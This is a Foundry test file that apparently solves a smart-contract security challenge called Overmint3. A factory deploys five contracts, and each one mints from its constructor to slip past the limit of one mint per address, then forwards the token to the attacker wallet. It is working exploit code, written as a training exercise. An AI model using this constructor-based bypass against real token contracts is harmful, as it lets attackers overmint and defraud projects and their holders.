// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Overmint3} from "../src/Overmint3.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint3Test is Test {
    Overmint3 victimContract;
    address attackerWallet;

    function setUp() public {
        victimContract = new Overmint3();
        attackerWallet = address(0x1234); // Replace with an actual address if needed
    }

    function testExploit() public {
        // Conduct your attack here
        vm.startPrank(attackerWallet);
        new ExploitFactory(victimContract, attackerWallet);

        // Assert the expected outcomes
        assertEq(victimContract.balanceOf(attackerWallet), 5, "Balance should be 5");
        assertEq(vm.getNonce(attackerWallet), 1, "Must exploit one transaction");
    }
}

contract ExploitFactory {
    Overmint3 overmint3;
    uint8 count;
    address player;

    constructor(Overmint3 _overmint3, address _player) {
        overmint3 = _overmint3;
        player = _player;

        for (uint8 i = 0; i < 5; i++) {
            (new Exploit(overmint3, player));
        }
    }
}

contract Exploit {
    // Overmint3 overmint3;
    // uint8 count;

    constructor(Overmint3 overmint3, address player) {
        overmint3.mint();
        overmint3.safeTransferFrom(address(this), player, overmint3.totalSupply());
    }
}
